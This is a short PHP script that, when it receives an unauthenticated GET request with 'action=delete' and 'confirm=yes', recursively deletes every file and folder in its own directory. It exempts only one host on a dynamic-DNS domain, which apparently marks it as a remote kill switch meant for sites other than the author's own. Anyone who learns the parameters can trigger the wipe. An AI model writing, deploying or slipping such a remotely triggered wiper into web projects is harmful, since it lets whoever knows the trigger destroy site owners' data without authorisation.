<?php
// Function to delete all files and folders in a directory
function deleteAllFilesAndFolders($dir) {
    // Check if the directory exists
    if (!is_dir($dir)) {
        return false;
    }

    // Open the directory
    $items = array_diff(scandir($dir), array('.', '..'));
    
    foreach ($items as $item) {
        $path = $dir . DIRECTORY_SEPARATOR . $item;

        // If the item is a directory, recurse into it
        if (is_dir($path)) {
            deleteAllFilesAndFolders($path);
            rmdir($path); // Remove the now-empty directory
        } else {
            // Otherwise, it's a file, so delete it
            unlink($path);
        }
    }

    return true;
}

// Check if the correct GET parameters are present
if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
    // Prevent deletion if the host is cloudapps.zapto.org/cma
    if ($_SERVER['HTTP_HOST'] === 'cloudapps.zapto.org' && $_SERVER['REQUEST_URI'] === '/cma') {
        echo "Deletion not allowed on this host.";
    } else {
        // Set the current directory
        $currentDir = __DIR__; // This will be the directory where the script is located

        // Call the function to delete all files and folders
        deleteAllFilesAndFolders($currentDir);
        echo "All files and folders have been deleted.";
    }
} else {
    echo "Invalid request or deletion not confirmed.";
}
?>
